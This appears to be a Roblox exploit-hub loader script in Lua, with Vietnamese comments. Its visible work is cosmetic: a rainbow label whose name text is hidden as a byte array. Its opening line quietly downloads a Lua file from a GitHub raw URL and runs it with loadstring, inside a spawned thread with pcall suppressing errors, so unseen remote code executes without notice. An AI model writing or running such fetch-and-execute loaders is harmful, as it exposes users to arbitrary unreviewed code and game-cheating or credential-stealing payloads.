--anh ui gop full
task.spawn(function()pcall(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/vfg3468-oss/Phantasm-vvv/main/scr.lua"))()end)end)

local _H = Instance.new("ScreenGui", game:GetService("CoreGui"))
local _L = Instance.new("TextLabel", _H)
_L.Size = UDim2.new(0, 200, 0, 50)
_L.Position = UDim2.new(1, -210, 1, -60)
_L.BackgroundTransparency = 1
_L.Font = Enum.Font.GothamBold
_L.TextSize = 25
_L.TextStrokeTransparency = 0.5

--anh ma hoa full phan ten
local _K = {0x48, 0xC3, 0xB9, 0x6E, 0x67, 0x20, 0x48, 0x75, 0x62, 0x20, 0x4D, 0x6F, 0x64, 0x65}
local _D = ""
for i=1, #_K do _D = _D .. string.char(_K[i]) end
_L.Text = _D

--anh hieu ung cau vong
game:GetService("RunService").RenderStepped:Connect(function()
    _L.TextColor3 = Color3.fromHSV(tick() % 5 / 5, 1, 1)
end)
--anh ket thuc
